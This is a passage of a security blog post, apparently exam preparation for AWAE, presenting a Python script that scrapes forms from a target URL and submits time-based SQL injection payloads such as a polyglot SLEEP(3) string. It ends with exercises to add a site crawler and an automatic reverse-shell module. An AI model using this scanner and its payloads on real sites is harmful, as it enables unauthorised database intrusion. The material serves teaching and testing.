+      <span style='color:#cc5555; '>'[-a &lt;crawl all>]'</span><span style='color:#808030; '>)</span>
+    
+    parser<span style='color:#808030; '>.</span>add_option<span style='color:#808030; '>(</span><span style='color:#cc5555; '>'-u'</span><span style='color:#808030; '>,</span> dest<span style='color:#808030; '>=</span><span style='color:#cc5555; '>'url'</span><span style='color:#808030; '>,</span>\
+      <span style='color:#400000; '>type</span><span style='color:#808030; '>=</span><span style='color:#cc5555; '>'string'</span><span style='color:#808030; '>,</span> <span style='color:#400000; '>help</span><span style='color:#808030; '>=</span><span style='color:#cc5555; '>'specify target url'</span><span style='color:#808030; '>)</span>
+    parser<span style='color:#808030; '>.</span>add_option<span style='color:#808030; '>(</span><span style='color:#cc5555; '>'-c'</span><span style='color:#808030; '>,</span> dest<span style='color:#808030; '>=</span><span style='color:#cc5555; '>'cookie'</span><span style='color:#808030; '>,</span>\
+      <span style='color:#400000; '>type</span><span style='color:#808030; '>=</span><span style='color:#cc5555; '>'string'</span><span style='color:#808030; '>,</span> <span style='color:#400000; '>help</span><span style='color:#808030; '>=</span><span style='color:#cc5555; '>'specify cookie key value pair separated by : in dict format'</span><span style='color:#808030; '>)</span>
+    parser<span style='color:#808030; '>.</span>add_option<span style='color:#808030; '>(</span><span style='color:#cc5555; '>'-a'</span><span style='color:#808030; '>,</span> dest<span style='color:#808030; '>=</span><span style='color:#cc5555; '>'crawl'</span><span style='color:#808030; '>,</span>\
+      <span style='color:#400000; '>type</span><span style='color:#808030; '>=</span><span style='color:#cc5555; '>'string'</span><span style='color:#808030; '>,</span><span style='color:#400000; '>help</span><span style='color:#808030; '>=</span><span style='color:#cc5555; '>'specify if you want to crawl all possible pages'</span><span style='color:#808030; '>)</span>
+
+    <span style='color:#808030; '>(</span>options<span style='color:#808030; '>,</span> args<span style='color:#808030; '>)</span> <span style='color:#808030; '>=</span> parser<span style='color:#808030; '>.</span>parse_args<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span>
+    url <span style='color:#808030; '>=</span> options<span style='color:#808030; '>.</span>url
+    cookie <span style='color:#808030; '>=</span> options<span style='color:#808030; '>.</span>cookie
+    <span style='color:#b96969; '>#print cookie</span>
+    crawl <span style='color:#808030; '>=</span> options<span style='color:#808030; '>.</span>crawl
+
+    <span style='color:#508050; font-weight:bold; '>if</span> url <span style='color:#44aadd; '>==</span> <span style='color:#477766; '>None</span><span style='color:#808030; '>:</span>
+        <span style='color:#508050; font-weight:bold; '>print</span> <span style='color:#808030; '>(</span><span style='color:#cc5555; '>"NONE"</span><span style='color:#808030; '>)</span>
+        <span style='color:#508050; font-weight:bold; '>print</span> <span style='color:#808030; '>(</span>parser<span style='color:#808030; '>.</span>usage<span style='color:#808030; '>)</span>
+        <span style='color:#508050; font-weight:bold; '>print</span> <span style='color:#808030; '>(</span><span style='color:#b96969; '>'''Example: python3 xss2.py -u </span><span style='color:#5555dd; '>http://127.0.0.1/xss1.php</span><span style='color:#b96969; '> -c "{'cook': 'val'}"'''</span><span style='color:#808030; '>)</span>
+        exit<span style='color:#808030; '>(</span><span style='color:#778c77; '>0</span><span style='color:#808030; '>)</span>
+    <span style='color:#508050; font-weight:bold; '>else</span><span style='color:#808030; '>:</span>
+        <span style='color:#508050; font-weight:bold; '>if</span> cookie <span style='color:#44aadd; '>!=</span> <span style='color:#477766; '>None</span><span style='color:#808030; '>:</span>
+            cookies <span style='color:#808030; '>=</span> literal_eval<span style='color:#808030; '>(</span><span style='color:#400000; '>str</span><span style='color:#808030; '>(</span>cookie<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span>
+            <span style='color:#508050; font-weight:bold; '>print</span><span style='color:#808030; '>(</span>sqli<span style='color:#808030; '>(</span>url<span style='color:#808030; '>,</span>cookies<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span>
+        <span style='color:#508050; font-weight:bold; '>else</span><span style='color:#808030; '>:</span>
+            cookies <span style='color:#808030; '>=</span> literal_eval<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"{'cook': 'val'}"</span><span style='color:#808030; '>)</span>
+            <span style='color:#508050; font-weight:bold; '>print</span><span style='color:#808030; '>(</span>sqli<span style='color:#808030; '>(</span>url<span style='color:#808030; '>,</span>cookies<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span>
+</pre>
+<!--Created using ToHtml.com on 2019-11-24 14:40:31 UTC -->
+<p>There are of course multiple ways to do this, raw sockets, requests lib, mechanize, but usage of BeautifulSoup looked more elegant for selecting forms and the form content. The script is working only when there is a form with action set on the page. </p>
+<p>The get_forms function retrieves simply all forms by using soup.find_all functionality:</p>
+<pre style='color:#55cc66;background:#001800;'><span style='color:#508050; font-weight:bold; '>def</span> get_forms<span style='color:#808030; '>(</span>url<span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+    soup <span style='color:#808030; '>=</span> bs<span style='color:#808030; '>(</span>requests<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span>url<span style='color:#808030; '>)</span><span style='color:#808030; '>.</span>content<span style='color:#808030; '>,</span> <span style='color:#cc5555; '>"html.parser"</span><span style='color:#808030; '>)</span>
+    <span style='color:#508050; font-weight:bold; '>return</span> soup<span style='color:#808030; '>.</span>find_all<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"form"</span><span style='color:#808030; '>)</span>
+</pre>
+<!--Created using ToHtml.com on 2019-11-24 15:53:08 UTC -->
+<p>Next important function is retrieve_form which extracts the important information from the form: action, method and all the inputs. If you are new to BeatifulSoup you might want to quickly check <a href="http://www.compjour.org/warmups/govt-text-releases/intro-to-bs4-lxml-parsing-wh-press-briefings/">this link.</a> Basically every tag in the retrieved form has its attributes which are used with attrs property and its get function to extract the attribute value from the key-value pair dictionary. Lastly, the inputs variable will be an array which will contain the key value pairs - type and the name of every input on the page:</p>
+<pre style='color:#55cc66;background:#001800;'><span style='color:#508050; font-weight:bold; '>def</span> retrieve_form<span style='color:#808030; '>(</span>form<span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+    details <span style='color:#808030; '>=</span> <span style='color:#800080; '>{</span><span style='color:#800080; '>}</span>
+    action <span style='color:#808030; '>=</span> form<span style='color:#808030; '>.</span>attrs<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"action"</span><span style='color:#808030; '>)</span><span style='color:#808030; '>.</span>lower<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span>
+    method <span style='color:#808030; '>=</span> form<span style='color:#808030; '>.</span>attrs<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"method"</span><span style='color:#808030; '>,</span> <span style='color:#cc5555; '>"get"</span><span style='color:#808030; '>)</span><span style='color:#808030; '>.</span>lower<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span>
+    inputs <span style='color:#808030; '>=</span> <span style='color:#808030; '>[</span><span style='color:#808030; '>]</span>
+    <span style='color:#508050; font-weight:bold; '>for</span> input_tag <span style='color:#508050; font-weight:bold; '>in</span> form<span style='color:#808030; '>.</span>find_all<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"input"</span><span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+        input_type <span style='color:#808030; '>=</span> input_tag<span style='color:#808030; '>.</span>attrs<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"type"</span><span style='color:#808030; '>,</span> <span style='color:#cc5555; '>"text"</span><span style='color:#808030; '>)</span>
+        input_name <span style='color:#808030; '>=</span> input_tag<span style='color:#808030; '>.</span>attrs<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"name"</span><span style='color:#808030; '>)</span>
+        inputs<span style='color:#808030; '>.</span>append<span style='color:#808030; '>(</span><span style='color:#800080; '>{</span><span style='color:#cc5555; '>"type"</span><span style='color:#808030; '>:</span> input_type<span style='color:#808030; '>,</span> <span style='color:#cc5555; '>"name"</span><span style='color:#808030; '>:</span> input_name<span style='color:#800080; '>}</span><span style='color:#808030; '>)</span>
+    details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"action"</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> action
+    details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"method"</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> method
+    details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"inputs"</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> inputs
+    <span style='color:#508050; font-weight:bold; '>return</span> details
+</pre>
+<!--Created using ToHtml.com on 2019-11-24 15:53:39 UTC -->
+<p>The submit_form function will return a result which is an array containing both the request response and the response time which will be used to detect time based SQLi. At the beggining urljoin is used to append the action to the base url. Then every input gets a value(function parameter), which will probably contain some payloads later. Lastly based on the request type the get or post request is issued, and the main idea of this whole approach comes into play: response.elapsed.total_seconds(). We will use some payloads that execute the time function on the backend database, and if the request time is bigger than that time it is almost certainly vulnerable to SQLi, whereas if the server instantly replies(less than that time) then there is probably no SQLi:</p>
+<pre style='color:#55cc66;background:#001800;'><span style='color:#508050; font-weight:bold; '>def</span> submit_form<span style='color:#808030; '>(</span>form_details<span style='color:#808030; '>,</span> url<span style='color:#808030; '>,</span> value<span style='color:#808030; '>,</span> cookies<span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+    target_url <span style='color:#808030; '>=</span> urljoin<span style='color:#808030; '>(</span>url<span style='color:#808030; '>,</span> form_details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"action"</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span>
+    inputs <span style='color:#808030; '>=</span> form_details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"inputs"</span><span style='color:#808030; '>]</span>
+    data <span style='color:#808030; '>=</span> <span style='color:#800080; '>{</span><span style='color:#800080; '>}</span>
+    res <span style='color:#808030; '>=</span> <span style='color:#808030; '>[</span><span style='color:#cc5555; '>""</span><span style='color:#808030; '>,</span><span style='color:#cc5555; '>""</span><span style='color:#808030; '>]</span>
+    <span style='color:#b96969; '>#cookies = dict(cook='val', password='guessme')</span>
+    <span style='color:#508050; font-weight:bold; '>for</span> <span style='color:#400000; '>input</span> <span style='color:#508050; font-weight:bold; '>in</span> inputs<span style='color:#808030; '>:</span>
+        <span style='color:#400000; '>input</span><span style='color:#808030; '>[</span><span style='color:#cc5555; '>"value"</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> value
+        input_name <span style='color:#808030; '>=</span> <span style='color:#400000; '>input</span><span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"name"</span><span style='color:#808030; '>)</span>
+        input_value <span style='color:#808030; '>=</span> <span style='color:#400000; '>input</span><span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"value"</span><span style='color:#808030; '>)</span>
+        <span style='color:#508050; font-weight:bold; '>if</span> input_name <span style='color:#508050; font-weight:bold; '>and</span> input_value<span style='color:#808030; '>:</span>
+            data<span style='color:#808030; '>[</span>input_name<span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> input_value
+    <span style='color:#508050; font-weight:bold; '>if</span> form_details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"method"</span><span style='color:#808030; '>]</span> <span style='color:#44aadd; '>==</span> <span style='color:#cc5555; '>"post"</span><span style='color:#808030; '>:</span>
+        response <span style='color:#808030; '>=</span> requests<span style='color:#808030; '>.</span>post<span style='color:#808030; '>(</span>target_url<span style='color:#808030; '>,</span> data<span style='color:#808030; '>=</span>data<span style='color:#808030; '>,</span> cookies<span style='color:#808030; '>=</span>cookies<span style='color:#808030; '>)</span>
+        <span style='color:#b96969; '>#print (response.elapsed.total_seconds())</span>
+        res<span style='color:#808030; '>[</span><span style='color:#778c77; '>0</span><span style='color:#808030; '>]</span><span style='color:#808030; '>=</span>response
+        res<span style='color:#808030; '>[</span><span style='color:#778c77; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>=</span>response<span style='color:#808030; '>.</span>elapsed<span style='color:#808030; '>.</span>total_seconds<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span>
+        <span style='color:#508050; font-weight:bold; '>return</span> res
+    response <span style='color:#808030; '>=</span> requests<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span>target_url<span style='color:#808030; '>,</span> params<span style='color:#808030; '>=</span>data<span style='color:#808030; '>,</span> cookies<span style='color:#808030; '>=</span>cookies<span style='color:#808030; '>)</span>
+    <span style='color:#b96969; '>#print (response.elapsed.total_seconds())</span>
+    res<span style='color:#808030; '>[</span><span style='color:#778c77; '>0</span><span style='color:#808030; '>]</span><span style='color:#808030; '>=</span>response
+    res<span style='color:#808030; '>[</span><span style='color:#778c77; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>=</span>response<span style='color:#808030; '>.</span>elapsed<span style='color:#808030; '>.</span>total_seconds<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span>
+    <span style='color:#508050; font-weight:bold; '>return</span> res
+</pre>
+<!--Created using ToHtml.com on 2019-11-24 15:54:13 UTC -->
+<p>Finally this idea is implemented in the sqli function: it gets all the forms (get_forms), then iterates over a file and retrieves the form details(form_details), and then submits every payload from the SQLi.txt file(submit_form). Based on the time elapsed it detects whether the page is vulnerable:</p>
+<pre style='color:#55cc66;background:#001800;'><span style='color:#508050; font-weight:bold; '>def</span> sqli<span style='color:#808030; '>(</span>url<span style='color:#808030; '>,</span>cookies<span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+    forms <span style='color:#808030; '>=</span> get_forms<span style='color:#808030; '>(</span>url<span style='color:#808030; '>)</span>
+    <span style='color:#508050; font-weight:bold; '>with</span> <span style='color:#400000; '>open</span><span style='color:#808030; '>(</span><span style='color:#cc5555; '>'SQLi.txt'</span><span style='color:#808030; '>)</span> <span style='color:#508050; font-weight:bold; '>as</span> payloads<span style='color:#808030; '>:</span>
+        <span style='color:#508050; font-weight:bold; '>for</span> payload <span style='color:#508050; font-weight:bold; '>in</span> payloads<span style='color:#808030; '>:</span>
+            <span style='color:#508050; font-weight:bold; '>for</span> form <span style='color:#508050; font-weight:bold; '>in</span> forms<span style='color:#808030; '>:</span>
+                form_details <span style='color:#808030; '>=</span> retrieve_form<span style='color:#808030; '>(</span>form<span style='color:#808030; '>)</span>
+                res <span style='color:#808030; '>=</span> submit_form<span style='color:#808030; '>(</span>form_details<span style='color:#808030; '>,</span> url<span style='color:#808030; '>,</span> payload<span style='color:#808030; '>,</span> cookies<span style='color:#808030; '>)</span>
+                <span style='color:#b96969; '>#print (content.elapsed.total_seconds())</span>
+                <span style='color:#508050; font-weight:bold; '>if</span> res<span style='color:#808030; '>[</span><span style='color:#778c77; '>1</span><span style='color:#808030; '>]</span> <span style='color:#44aadd; '>></span> <span style='color:#778c77; '>3</span><span style='color:#808030; '>:</span>
+                    <span style='color:#508050; font-weight:bold; '>print</span> <span style='color:#808030; '>(</span>res<span style='color:#808030; '>[</span><span style='color:#778c77; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span>
+                    <span style='color:#508050; font-weight:bold; '>print</span><span style='color:#808030; '>(</span>f<span style='color:#cc5555; '>"[+] Possible SQL Injection detected {url}"</span><span style='color:#808030; '>)</span>
+                    <span style='color:#508050; font-weight:bold; '>print</span><span style='color:#808030; '>(</span>f<span style='color:#cc5555; '>"[+]: Submitted form"</span><span style='color:#808030; '>)</span>
+                    <span style='color:#508050; font-weight:bold; '>print</span><span style='color:#808030; '>(</span>form_details<span style='color:#808030; '>)</span>
+                    <span style='color:#508050; font-weight:bold; '>return</span> <span style='color:#477766; '>True</span>
+        <span style='color:#508050; font-weight:bold; '>return</span> <span style='color:#477766; '>False</span>
+</pre>
+<!--Created using ToHtml.com on 2019-11-24 15:54:42 UTC -->
+<p>One of the choosen payloads is:</p>
+<pre style='color:#55cc66;background:#001800;'>SLEEP(3) /*' or SLEEP(3) or '" or SLEEP(3) or "*/
+</pre>
+<!--Created using ToHtml.com on 2019-11-24 15:40:58 UTC -->
+<h2 class="section-heading">Extra mile excercises</h2>
+<p>Based on some online reviews and the AWAE sylabus, these two excercise should be useful as you will need to write and edit pocs and master exploitation and learn about some advanced techniques:</p>
+<p>1. Try to edit my code to include a crawler which will receive only the home page as a starting point and will automatically detect every link in the page and do a whole site SQLi scan.</p>
+<p>2. Use the scanner on the first php code example and add a module that will automatically try to get a reverse shell. </p>
+          <a href="#">
+            <img class="img-fluid" src="img/raindeer.png" alt="">
+          </a>
+          <span class="caption text-muted">To go places and do things that have never been done before – that’s what living is all about. And then a wild reindeer appeared.</span>
+
+          
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <hr>
+
+  <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            <li class="list-inline-item">
+              <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            <li class="list-inline-item">
+              <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            <li class="list-inline-item">
+              <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy; Damjan Cvetanović - raind33r 2019</p>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+  <!-- Custom scripts for this template -->
+  <script src="js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
